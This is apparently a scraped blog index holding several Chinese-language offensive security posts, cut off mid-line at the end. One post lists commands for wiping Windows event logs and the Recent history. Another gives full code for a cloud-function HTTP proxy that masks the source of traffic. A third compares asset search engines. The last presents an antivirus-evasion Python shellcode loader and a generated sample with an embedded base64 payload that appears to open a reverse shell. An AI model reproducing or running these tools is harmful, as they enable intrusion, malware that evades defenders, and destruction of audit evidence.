-i:EVT &quot;SELECT TimeGenerated,EventID,EXTRACT_TOKEN(Strings,1,&#x27;|&#x27;) as UserName,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as ProcessName FROM Security ORDER BY TimeGenerated desc&quot; -o:tsv &gt; c:\\1.txt 日志清除（管理员权限）清除日志之后会留下清除日志的审核事件。 手动删除： 开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志 meterperter自带清除日志功能： 123清除windows中的应用程序日志、系统日志、安全日志 clearev 查看事件日志: run event_manager -i清理事件日志: run event_manager -c wevtutil： 1234wevtutil el 列出系统中所有日志名称wevtutil cl system 清理系统日志wevtutil cl application 清理应用程序日志wevtutil cl security 清理安全日志 Clear-Eventlog（powershell） 1Clear-Eventlog -Log Application, System,Security 清除应用程序和服务日志 1FOR /F &quot;delims=&quot; %I IN (&#x27;WEVTUTIL EL&#x27;) DO (WEVTUTIL CL &quot;%I&quot;) 前面所有命令都只是清除了windows日志，没有清除应用程序和服务日志，这个命令可以清除。 清除应用程序和服务日志： 清除recent： recent是windows下用户打开的文档历史文件记录 。 123在文件资源管理器中点击“查看”-&gt;“选项”-&gt;在常规-&gt;隐私中点击”清除”按钮或直接打开C:\\Users\\用户名\\Recent并删除所有内容或在命令行中输入del /f /s /q %userprofile%\\Recent*.* 清除之前： 清除之后： 参考连接（站在巨人的肩膀上登高望远）： https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx?i=j https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/wevtutil https://www.freebuf.com/vuls/175560.html https://mp.weixin.qq.com/s/sah3GAVlOALP4hx7vk8eJA https://mp.weixin.qq.com/s/pzQxkl3Ngbapuso75LgnLQ https://blog.csdn.net/Z_Z_W_/article/details/104406072 https://blog.csdn.net/Captain_RB/article/details/109573106","tags":[{"name":"总结","slug":"总结","permalink":"https://mrwq.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"日志","slug":"日志","permalink":"https://mrwq.github.io/tags/%E6%97%A5%E5%BF%97/"}]},{"title":"云函数实现类SSRF","path":"云函数实现类SSRF/","text":"云函数的概念与原理1.云函数的概念云函数（Serverless Cloud Function，SCF）是腾讯云为企业和开发者们提供的无服务器执行环境，帮助您在无需购买和管理服务器的情况下运行代码。您只需使用平台支持的语言编写核心代码并设置代码运行的条件，即可在腾讯云基础设施上弹性、安全地运行代码。SCF 是实时文件处理和数据处理等场景下理想的计算平台。 2.无服务器的概念无服务器（Serverless）不是表示没有服务器，而表示当您在使用 Serverless 时，您无需关心底层资源，也无需登录服务器和优化服务器，只需关注最核心的代码片段，即可跳过复杂的、繁琐的基本工作。核心的代码片段完全由事件或者请求触发，平台根据请求自动平行调整服务资源。Serverless 拥有近乎无限的扩容能力，空闲时，不运行任何资源。代码运行无状态，可以轻易实现快速迭代、极速部署。 3.函数即服务函数即服务提供了一种直接在云上运行无状态的、短暂的、由事件触发的代码的能力。 函数即服务和传统应用架构不同，函数服务提供的是事件触发式的运行方式，云函数不是始终运行的状态，而是在事件发生时由事件触发运行，并且在一次运行的过程中处理这一次事件。因此在云函数的代码中，仅需考虑针对一个事件的处理流程，而针对大量事件的高并发处理，由平台实现云函数的多实例并发来支持。 为了实现对高并发的支持，云函数平台提供了自动的弹性伸缩能力，会在有大量请求到来时启动更多实例来处理事件请求，也会在没有事件到来时缩减函数实例甚至到零实例。因此为了匹配自动扩缩能力，需要函数代码使用的是无状态开发方式，即不在云函数的运行内存中保留相关的状态数据并在多次运行时依赖这些状态数据。云函数的状态数据，可以依赖外部的持久存储能力例如云缓存、云数据库、云存储来进行。 4.触发器和触发源任何可以产生事件，触发云函数执行的均可以被称为触发器或触发源。触发器在本身产生事件后，通过将事件传递给云函数来触发函数运行。 触发器在触发函数时，可以根据自身特点，使用同步或异步方式触发函数。同步方式触发函数时，触发器将等待函数执行完成并获取到函数执行结果；异步方式触发函数时，触发器将仅触发函数而忽略函数执行结果。 腾讯云云函数在和腾讯云的某些产品或服务对接时，也有自身实现的一些特殊方式，例如推（PUSH）模式和拉（PULL）模式。 推模式：触发器主动将事件推送至云函数平台并触发函数运行。 拉模式：云函数平台通过拉取模块，从触发器中拉取到事件并触发云函数运行。 5.使用流程以下为云函数使用流程图及基本步骤简介： 准备工作：包含注册腾讯云账号、开通云函数服务、配置基本开发环境等。 编写函数：函数是调度与运行的基本单元，编写函数时需遵循函数接口规范。 本地测试：可在本地进行代码调试，并将代码部署到云端。 部署函数（含配置触发器）：代码部署到云端后，云函数可在配置好条件后执行函数。函数的执行条件被称为触发器，您可以配置定时、API 网关、COS 等多种触发器。 云端测试：函数在云端部署完成后，可通过已配置的触发方式测试云函数。 查看日志：云函数支持以多种方式查看历史或实时的函数日志。 查看监控：可通过查看监控指标，了解函数运行的状况。 配置告警：对于线上生产业务非常关键。在配置告警后，当业务出现异常情况，您可以及时收到告警信息。 6.开发指南执行方法SCF 平台在调用云函数时，首先会寻找执行方法作为入口，执行用户的代码。此时，用户需以文件名. 执行方法名的形式进行设置。例如，用户设置的执行方法为 index.handler，则 SCF 平台会首先寻找代码程序包中的 index 文件，并找到该文件中的 handler 方法开始执行。在编写执行方法时，用户需遵循平台特定的编程模型。如下所示： 123def method_name(event,context): ... return some_value 该模型中指定固定的 event 事件数据和 context 环境数据作为入参。在执行方法中，用户需对参数进行处理，并且可任意调用代码中的任何其他方法。 函数入参函数入参，是指函数在被触发调用时所传递给函数的内容。通常情况下，函数入参包括 event 入参和 context 入参两部分，但根据开发语言和环境的不同，入参个数可能有所不同。 event 入参作用参数类型为 dict。将 event 入参传递给执行方法，实现代码与触发函数的事件（event）交互。例如，由于文件上传触发了函数运行，代码可从 event 参数中获取该文件所有信息，包括文件名、下载路径、文件类型、大小等。 使用说明针对不同的函数情况，event 参数的值有以下区别： 云服务触发函数时，云服务会将事件以一种平台预定义的、不可更改的格式作为 event 参数传给 SCF 函数，您可以根据此格式编写代码并从 event 参数中获取信息。例如，COS 触发函数时会将 Bucket 及文件的具体信息以 JSON 格式传递给 event 参数。 云函数被其他应用程序调用时，您可以在调用方和函数代码之间自定义一个 dict 类型的参数。调用方按照定义好的格式传入数据，函数代码按格式获取数据。例如，定义一个 dict 类型的数据结构 &#123;&quot;key&quot;:&quot;XXX&quot;&#125;，当调用方传入数据 &#123;&quot;key&quot;:&quot;abctest&quot;&#125; 时，函数代码可以通过 event[key] 来获得值 abctest。 context 入参作用将 context 入参传递给执行方法，代码将通过 context 入参对象，了解到运行环境及当前请求的相关内容。 使用说明请参考以下 context 入参，了解具体信息： 1234567891011121314&#123; getRemainingTimeInMillis: [Function: getRemainingTimeInMillis], memory_limit_in_mb: 128, time_limit_in_ms: 3000, request_id: &#x27;4ca7089c-3bb0-48cf-bcdb-26d130fed2ae&#x27;, environment: &#x27;&#123;&quot;SCF_NAMESPACE&quot;:&quot;default&quot;&#125;&#x27;, environ: &#x27;SCF_NAMESPACE=default;SCF_NAMESPACE=default&#x27;, function_version: &#x27;$LATEST&#x27;, function_name: &#x27;test&#x27;, namespace: &#x27;default&#x27;, tencentcloud_region: &#x27;ap-chengdu&#x27;, tencentcloud_appid: &#x27;1253970226&#x27;, tencentcloud_uin: &#x27;3473058547&#x27;&#125; 其中包括了当前调用的执行超时时间，内存限制，以及当次请求 ID。 WEB 函数的概念与原理WEB 函数Web 函数（Web Function）是云函数的一种函数类型，区别于事件函数（Event Function）对于事件格式的限制，专注于优化 Web 服务场景，用户可以直接发送 HTTP 请求到 URL 触发函数执行。 运行原理 Web 函数运行原理如下图所示： 用户发送的 HTTP 请求经过 API 网关后，网关侧将原生请求直接透传的同时，在请求头部添加了网关触发函数时需要的函数名、函数地域等内容，并一起传递到函数环境，触发后端函数执行。 函数环境内，通过内置的 Proxy 实现 Nginx 转发，并去除头部非产品规范的请求信息，将原生 HTTP 请求通过指定端口发送给用户的 Web Server 服务。 用户的 Web Server 配置好指定的监听端口9000和服务启动文件后部署到云端，通过该端口获取 HTTP 请求并进行处理。 API 网关触发机制API 网关触发器的集成请求事件消息结构在 API 网关触发器接收到请求时，会将类似以下 JSON 格式的事件数据发送给绑定的云函数。 1234567891011121314151617181920212223242526272829303132333435363738&#123;&quot;requestContext&quot;: &#123; &quot;serviceId&quot;: &quot;service-f94sy04v&quot;, &quot;path&quot;: &quot;/test/&#123;path&#125;&quot;, &quot;httpMethod&quot;: &quot;POST&quot;, &quot;requestId&quot;: &quot;c6af9ac6-7b61-11e6-9a41-93e8deadbeef&quot;, &quot;identity&quot;: &#123; &quot;secretId&quot;: &quot;abdcdxxxxxxxsdfs&quot; &#125;, &quot;sourceIp&quot;: &quot;10.0.2.14&quot;, &quot;stage&quot;: &quot;release&quot;&#125;,&quot;headers&quot;: &#123; &quot;accept-Language&quot;: &quot;en-US,en,cn&quot;, &quot;accept&quot;: &quot;text/html,application/xml,application/json&quot;, &quot;host&quot;: &quot;service-3ei3tii4-251000691.ap-guangzhou.apigateway.myqloud.com&quot;, &quot;user-Agent&quot;: &quot;User Agent String&quot;&#125;,&quot;body&quot;: &quot;&#123;\\&quot;test\\&quot;:\\&quot;body\\&quot;&#125;&quot;,&quot;pathParameters&quot;: &#123; &quot;path&quot;: &quot;value&quot;&#125;,&quot;queryStringParameters&quot;: &#123; &quot;foo&quot;: &quot;bar&quot;&#125;,&quot;headerParameters&quot;:&#123; &quot;Refer&quot;: &quot;10.0.2.14&quot;&#125;,&quot;stageVariables&quot;: &#123; &quot;stage&quot;: &quot;release&quot;&#125;,&quot;path&quot;: &quot;/test/value&quot;,&quot;queryString&quot;: &#123; &quot;foo&quot; : &quot;bar&quot;, &quot;bob&quot; : &quot;alice&quot;&#125;,&quot;httpMethod&quot;: &quot;POST&quot;&#125; 数据结构内容详细说明如下： 结构名 内容 requestContext 请求来源的 API 网关的配置信息、请求标识、认证信息、来源信息。其中：serviceId，path，httpMethod 指向 API 网关的服务 ID、API 的路径和方法。stage 指向请求来源 API 所在的环境。requestId 标识当前这次请求的唯一 ID。identity 标识用户的认证方法和认证的信息。sourceIp 标识请求来源 IP。 path 记录实际请求的完整 Path 信息。 httpMethod 记录实际请求的 HTTP 方法。 queryString 记录实际请求的完整 Query 内容。 body 记录实际请求转换为 String 字符串后的内容。 headers 记录实际请求的完整 Header 内容。 pathParameters 记录在 API 网关中配置过的 Path 参数以及实际取值。 queryStringParameters 记录在 API 网关中配置过的 Query 参数以及实际取值。 headerParameters 记录在 API 网关中配置过的 Header 参数以及实际取值。 API 网关触发器的集成响应返回数据结构在 API 网关设置为集成响应时，需要将包含以下 JSON 格式的数据结构返回给 API 网关。 123456&#123; &quot;isBase64Encoded&quot;: false, &quot;statusCode&quot;: 200, &quot;headers&quot;: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;, &quot;body&quot;: &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Heading&lt;/h1&gt;&lt;p&gt;Paragraph.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;&#125; 数据结构内容详细说明如下： 结构名 内容 isBase64Encoded 指明 body 内的内容是否为 Base64 编码后的二进制内容，取值需要为 JSON 格式的 true 或 false。 statusCode HTTP 返回的状态码，取值需要为 Integer 值。 headers HTTP 返回的头部内容，取值需要为多个 key-value 对象，或 key:[value,value] 对象。其中 key、value 均为字符串。headers 请求头暂不支持 Location key。 body HTTP 返回的 body 内容。 WEB 函数的实际应用创建 WEB 函数1.访问腾讯云云函数：https://console.cloud.tencent.com/scf/list 2.选择地区 3.新建云函数，选择自定义模板。为了测试云函数，代码先选择默认的 4.配置 触发器，选择 api 网关 访问云函数 查看访问日志 浏览器访问，返回 403 查看日志，可以看到来源 ip 和请求方法，请求服务，请求路径等等 修改 WEB 函数的返回内容为下面代码，在通过浏览器访问就会正常了。至此，WEB 函数的实际使用流程走通了 12a = &#123;&quot;isBase64Encoded&quot;: False,&quot;statusCode&quot;: 200,&quot;headers&quot;: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;,&quot;body&quot;: &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Heading&lt;/h1&gt;&lt;p&gt;Paragraph.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;&#125; return(a) HTTP 代理测试实现 GET 型类 SSRF在 WEB 函数中，可以使用 queryString 字段来获取 GET 请求的参数 1234567891011121314# -*- coding: utf8 -*-import jsonimport requestsdef main_handler(event, context): # 提取GET查询 query = event[&#x27;queryString&#x27;] # 获取query中的url url = query[&#x27;url&#x27;] # 使用requests模块请求url，并将结果返回 resp = requests.get(url) t = resp.content.decode() text = &#123;&quot;isBase64Encoded&quot;: False,&quot;statusCode&quot;: 200,&quot;headers&quot;: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;,&quot;body&quot;: t&#125; return(text) 浏览器访问效果如下： 访问百度 访问 http://tool.chinaz.com/ipwhois，查看 ip POST 型类 SSRF将 WEB 函数改为下面这样 1234567891011121314# -*- coding: utf8 -*-import jsonimport requestsdef main_handler(event, context): # 提取POST过来的body内容 body = event[&#x27;body&#x27;] # 因为body是字符串，所以先转换为字典 body = json.loads(body) # 获取body中的url url = body[&#x27;url&#x27;] # 使用requests模块请求url，并将结果返回 resp = requests.get(url) text = &#123;&quot;isBase64Encoded&quot;: False,&quot;statusCode&quot;: 200,&quot;headers&quot;: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;,&quot;body&quot;: resp.content.decode()&#125; return(text) 通过在线 http 接口测试工具，来验证 WEB 函数 3.HTTP 代理 DEMO 云函数可利用 API 网关触发器进行触发，接受来自客户端的数据，然后云函数可以对外发包，类似于一个 SSRF。 因此一个 HTTP 代理的实现思路就很简单了。本地客户端通过代理发送数据包，HTTP 代理服务器拦截数据包，提取 HTTP 报文相关信息，然后将报文以 JSON 格式 POST 到云函数进行解析，云函数根据解析到的信息对目标发起请求，最终将结果一层一层返回到客户端。 服务端依旧使用上面的 POST 型的 SSRF 代码，然后部署在 WEB 函数里，用来做代理请求公网资源。 客户端代码实现如下： 客户端是代理本地端口，接收浏览器请求，然后将请求转发给 web 函数，并接收 web 函数的返回结果，再将 web 函数的返回结果返回给浏览器。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/python3# -*- encoding: utf-8 -*-# @Author : ordar# @Python : 3.7.5import socketimport threadingimport reimport requestsimport random# 定义允许连接此服务端的ip和服务端端口，0.0.0.0代表任意ip都可以连接这个服务端bind_ip = &quot;0.0.0.0&quot;bind_port = 8080# 服务地址应该是元组格式bind_server = (bind_ip, bind_port)# 建立一个socket对象server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 服务端绑定服务地址到套接字，server.bind(bind_server)# 监听端口，backlog 指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为 1，大部分应用程序设为 5 就可以了。server.listen(5)print(&quot;Listen on &#123;&#125;:&#123;&#125;&quot;.format(bind_ip, bind_port))# 定义WEB函数参数u_server = [&quot;https://service-3uzdw232-1258639052.gz.apigw.tencentcs.com/release/helloworld-1627548324&quot;]# 定义客户端处理线程,打印客户端传来的数据并回应def handle_client(client_socket): request_byte = client_socket.recv(1024) request_str = request_byte.decode() print(&quot;Received: &#123;&#125;&quot;.format(request_str)) # 使用云函数去请求数据 # 先使用正则提取url url = &quot;&quot; resp_text = &quot;&quot; try: url = re.findall(r&quot;GET (.*?) HTTP/1.1&quot;, request_str)[0] print(url) except Exception as e: print(e) if url: resp_text = get_response(url) print(&quot;Response: &#123;&#125;&quot;.format(resp_text)) # 返还一个数据包，然后关闭连接 client_socket.send(str(resp_text).encode(&#x27;utf-8&#x27;)) client_socket.close()# 使用WEB函数，获取WEB函数的返回def get_response(url): resp = requests.post(random.choice(u_server), json=&#123;&quot;url&quot;: url&#125;) return resp.content.decode()# 循环等待客户端连接while True: # 被动接受TCP客户端连接,(阻塞式)等待连接的到来 client, address = server.accept() print(&quot;Accept connection from: &#123;&#125;:&#123;&#125;&quot;.format(address[0], address[1])) # 创建客户端线程，处理传入的数据 client_handle_thread = threading.Thread(target=handle_client, args=(client,)) # 启动线程 client_handle_thread.start() 浏览器配置代理 访问百度 4.改进：HTTP 代理 DEMO 上面的 HTTP 代理 DEMO 有个很明显的短板，服务端使用 resp &#x3D; requests.get(url) 来请求公网资源，只支持 GET 方法；本地客户端代理使用 url &#x3D; re.findall(r”GET (.*?) HTTP&#x2F;1.1”, request_str)[0] 来提取来自浏览器的 url，也是只能提取到 GET 方法。 然后 HTTP 协议是支持 8 中请求方法的，所以为了实现完全的 HTTP 代理，要改进 demo 代码。 服务端代理改进后代码如下： 123456789101112131415161718# -*- coding: utf8 -*-import jsonimport requestsdef main_handler(event, context): # 提取POST过来的body内容 body = event[&#x27;body&#x27;] # 因为body是字符串，所以先转换为字典 body = json.loads(body) # 获取body中的url url = body[&#x27;url&#x27;] # 获取body中的method method = body[&#x27;method&#x27;] # 获取body中的headers,然后转换为字典 headers = json.loads(body[&#x27;headers&#x27;]) # 使用requests模块请求url，并将结果返回 resp = requests.request(method=method, url=url, headers=headers) text = &#123;&quot;isBase64Encoded&quot;: False, &quot;statusCode&quot;: 200, &quot;headers&quot;: &#123;&quot;Content-Type&quot;: &quot;text/html&quot;&#125;, &quot;body&quot;: resp.content.decode()&#125; return(text) 客户端代理改进后代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/python3# -*- encoding: utf-8 -*-# @Author : ordar# @Python : 3.7.5import socketimport threadingimport reimport requestsimport randomimport json# 定义允许连接此服务端的ip和服务端端口，0.0.0.0代表任意ip都可以连接这个服务端bind_ip = &quot;0.0.0.0&quot;bind_port = 8080# 服务地址应该是元组格式bind_server = (bind_ip, bind_port)# 建立一个socket对象server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 服务端绑定服务地址到套接字，server.bind(bind_server)# 监听端口，backlog 指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为 1，大部分应用程序设为 5 就可以了。server.listen(5)print(&quot;Listen on &#123;&#125;:&#123;&#125;&quot;.format(bind_ip, bind_port))# 定义WEB函数参数u_server = [&quot;WEB函数的url&quot;]# 定义客户端处理线程,打印客户端传来的数据并回应def handle_client(client_socket): request_byte = client_socket.recv(1024) request_str = request_byte.decode() print(&quot;Received: &#123;&#125;&quot;.format(request_str)) # ########使用云函数去请求数据 resp_text = &quot;&quot; try: # 先使用正则提取url temp = re.findall(r&quot;(\\w+) (.*?) HTTP/1.1&quot;, request_str)[0] method = temp[0] url = temp[1] # 解析headers headers = &#123;&#125; if url: a = request_str.strip().split(&quot;\\n&quot;)[2:] for line in a: if &quot;:&quot; in line: line_a = line.strip().split(&quot;: &quot;, 1) line_b = &#123;line_a[0]: line_a[1]&#125; headers.update(line_b) headers.pop(&quot;Connection&quot;) data = &#123; &quot;method&quot;: method, &quot;url&quot;: url, &quot;headers&quot;: json.dumps(headers) &#125; print(data) print(&quot;\\n&quot;) resp_text = get_response(data) print(&quot;Response: &#123;&#125;&quot;.format(resp_text)) except Exception as e: print(e) # 返还一个数据包，然后关闭连接 client_socket.send(str(resp_text).encode(&#x27;utf-8&#x27;)) client_socket.close()# 使用WEB函数，获取WEB函数的返回def get_response(data): # 给WEB函数发送请求 resp = requests.post(url=random.choice(u_server), json=data) return resp.content.decode()# 循环等待客户端连接while True: # 被动接受TCP客户端连接,(阻塞式)等待连接的到来 client, address = server.accept() print(&quot;Accept connection from: &#123;&#125;:&#123;&#125;&quot;.format(address[0], address[1])) # 创建客户端线程，处理传入的数据 client_handle_thread = threading.Thread(target=handle_client, args=(client,)) # 启动线程 client_handle_thread.start() 参考链接：https://cloud.tencent.com/document/product/583","tags":[{"name":"云函数","slug":"云函数","permalink":"https://mrwq.github.io/tags/%E4%BA%91%E5%87%BD%E6%95%B0/"}]},{"title":"网络空间搜索引擎的区别","path":"网络空间搜索引擎的区别/","text":"本文首发于先知社区：https://xz.aliyun.com/t/9386 网络空间搜索引擎的区别 1. fofafofa是白帽汇推出的网络空间测绘引擎。白帽汇是一家专注于网络空间测绘与前沿技术研究的互联网安全公司，主要从事网络安全产品开发与服务支撑等相关工作，为国家监管部门及政企用户提供综合性整体解决方案，有效提升网络安全整体防御实力。 优点个人使用比较多的一个。fofa特点是对资产特征收集比较完善，fofa语法我数了数多达40条，每一条都可以算作是资产的一个特征。fofa还支持图标搜索。 fofa新出的蜜罐识别功能可真是吊炸天了。攻防演练时对红队来说绝对是好消息。 fofa最好用的一点是针对服务进行结果展示。每当有新漏洞出现时，你会发现那些漏洞复现文章都喜欢放上一个fofadork，也就是fofa的搜索语法，使用这个语法可以快速的找到符合条件的可能有漏洞资产。这么说吧，fofa的漏洞相关性最好，更符合我们想快速复现漏洞的需求。 缺点资产重复性，还是这张图，可以看到虽然域名不同，但是ip是相同的，这对于想通过fofa来复现漏洞的需求来说这两条其实是一条。 会员普通用户网站查询结果只有50条，偏少。不过会员是终身的，这点还是很香的。 2. zoomeyezoomeye是知道创宇推出的国内最早的空间测绘引擎。 优点zoomeye怎么说呢，算是中规中矩吧。搜索结果主观显示ip和地理位置，右上角的小地图可以直观展示某个国家的数量，右下角是按照年份的统计。 缺点没有像fofa那样有域名相关的展示，对域名的搜索不是很友好 再一点就是结果展示耗时比较久，虽然它上面写的用时挺短的，但是从浏览器开始搜索到浏览器结果展示出来耗时挺多的。 会员会员比较贵而且按月付费。注册用户1000条api还是比较香的，通过网站查询最多浏览400条。 3. shodan 优点shodan更关注互联网上的主机。 shodan的结果展示比较全面，有Technologies专门展示这台主机的所有指纹。 主机详情页面，最上面可以查看主机的地理位置，右下角是开放的所有端口，左下角可以查看这台主机指纹，甚至某些主机还好在左下角展示出存在的漏洞。 缺点每天网站搜索限额，多少我忘记了。如果搜索比较多的话，很快就会限额不能搜索了。 会员按月付费，偏贵，会员搜索结果还是比较多的，而且可以用于商业用途。 普通用户网站查询最多20条。 4. sumapsumap是雷神众测实验室中的一款空间搜索引擎。 优点界面总体感觉跟fofa很像，然后结果展示跟shodan很像。 可以查看详情页，查看某一台主机的详细指纹和详细信息 还可以下载数据，下载结果是json格式的。fofa下载是要付费的。 缺点没有api查询，网站查询单次只能查看100条，比fofa多…。 会员未发现会员入口。 5. quakequake是360的一款空间测绘引擎。 优点可以很方便组合查询条件，点击条件即可自动加入and查询 还可以导出数据 缺点还不太成熟，经常性语法错误 ip地址显示不全面，好多都是星号，导出的结果里面也是好多星号*。就这一点来说使用体验极差。 会员注册用户每月3000积分，积分可以用来查询和导出数据。1积分可以导出1条数据，也就是说每月最多导出3000条数据。 6. censysCensys是一款免费的搜索引擎，最初由密歇根大学的研究人员在10月发行，目前由谷歌提供支持。 优点结果展示比较友好，ip和域名，指纹，端口，系统，协议，地理位置等可以有个直观的展示。网站查询结果可以达到1000条。 缺点语法比较复杂，上手难度大。 每月查询次数限额，注册用户每月最多查询250次。基本够用了。 会员普通用户基本够用，不能用于商业用途。 7. 谛听东北大学计算机学院姚羽教授组织学生编写研发——谛听(ditecting)网络空间工控设备搜索引擎。 优点是一款工控设备的网络空间搜索引擎，主要关注工控设备。对研究工控设备比较有用。 缺点只关注工控设备，平时用不到，这里就不多做笔墨了。 会员未发现会员入口 8. dnsdb全球DNS搜索引擎 优点DNSDB拥有近30亿DNS条记录，提供快速查询和反查功能 缺点普通用户功能较少，主要功能在会员用户上。查询解析到8.8.8.8的域名，查询出的结果不少，就是有星号，开会员可以去掉星号。 会员会员价格偏贵，毕竟只是查询dns。","tags":[{"name":"总结","slug":"总结","permalink":"https://mrwq.github.io/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"最简单的加载器免杀思路","path":"最简单的加载器免杀思路/","text":"本文首发于先知社区：https://xz.aliyun.com/t/9385 这部分源代码开放：https://github.com/MrWQ/HanGuang 最简单的加载器免杀思路 将加载器的变量每次生成都要随机也就是变量混淆， 同时在每行之间插入无效指令：比如随机打印，循环打印，随机数计算加减乘除 这个思路的主要作用是加载器伪装。不管shellcode如果变化加密解密，最后都要回到这个模板里面加载。就算是采用分离免杀的方法，shellcode本身不会被杀，但是这个加载器会被杀，所以经过这样伪装之后加载器可以存活，为后面各种花里胡哨的的免杀奠定基础。 source.py是模板shellcode.py是本程序生成的加载器,可以使用pyinstaller直接构建成exe 实践过程 这是从网上找来的python加载shellcode的代码，只要搜索谁都能找得到。把它作为模板进行伪装。 1234567891011121314151617181920212223242526272829import ctypes,base64,timebuf = &quot;&quot;shellcode = bytearray(buf)# 设置VirtualAlloc返回类型为ctypes.c_uint64ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64# 申请内存ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))# 放入shellcodebuffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buffered, ctypes.c_int(len(shellcode)))# 创建一个线程从shellcode防止位置首地址开始执行handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))# 等待上面创建的线程运行完ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) 先进行一个base的编码，方便将shellcode替换，因为要读raw原格式的payload，是二进制存储的。 编写一个用来生成随机的类 编写随机变量生成函数 模板中随机变量只有三个，分别是shellcode、ptr、buffered。只需要将这三个变量替换为随机字符串即可。 随机字符串这里设置为最小长度为5，最大长度为10，第一个字符不能为数字（因为这不符合python语法）。 编写随机空白指令函数 先在模板的每一行中间插入command1-7作为占位符，用来替换。同时添加flag_to_replace占位符用来替换shellcode。所以模板就变成了下面这样。 1234567891011121314151617181920212223242526272829303132333435363738394041import ctypes,base64,timecommand1shellcode = base64.b64decode(&#x27;flag_to_replace&#x27;)command2shellcode = bytearray(shellcode)command3ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64command4ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))command5buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)command5ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buffered, ctypes.c_int(len(shellcode)))command7handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) 函数处理也很简单，只需要替换掉占位符即可 生成空白指令函数也很简单，就是一个列表里面存了一些空白指令，然后从列表里面随机返回一个指令。当然空白指令也是随机生成的。 最终生成一个新的py文件，效果如下 123456789101112131415161718192021222324252627282930313233343536373839404142import ctypes,base64,timeneccpbehr7bzncnpqywr3v2ol1svhdf5sorlkam74un12v9e7oe0rwvsqgqdc41m2n98vla7evs74507267fjx3qp7dlhbubbvvn7k79xee2hop9y9qubj2ewhp3sb48hs1jutjttoqj8cv7m8tt4kcodmylsapgme8rbpvkkoq4mql82ez5tyehhygnk3s0hzpg4zlhzs8x7ju84e6x6acmnzrewpp6stb2q2g388ixfemy07cvr81szqg274k9clkug8t3vkbpkp7i5v2ztqug4lv7a65f2fubnxxj82o33tmvalu5zbyt5mda6p8zes6bstmwht23avbaci92ncppggtnbe37d648db3vbwipr38t8newrrrdhm2wngi27op1ix2eavi5mzlrhu7uvpscxsq0ggqfecihb9lxwg3p8h8lz1zbwkw7os41z3xgjj6kx54hf0vzqgwht1spbrb2wkt7nt1lu5p7eanl9r2fa3lzfujm6af809ywyh1doisakex5ijqo3h7v3qccayykmpbf4zztzpf821b350p5kk67364pltin0hrubn4ooglzkehc65xvoi94yp951mtm4candx8n4nu78q81sutt4v00h1mbasdw2ypqy8o9g3 = 42048826 - 7411178s50zd4mc = base64.b64decode(&#x27;/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhQSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKi1hUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&#x27;)time.sleep(3)s50zd4mc = 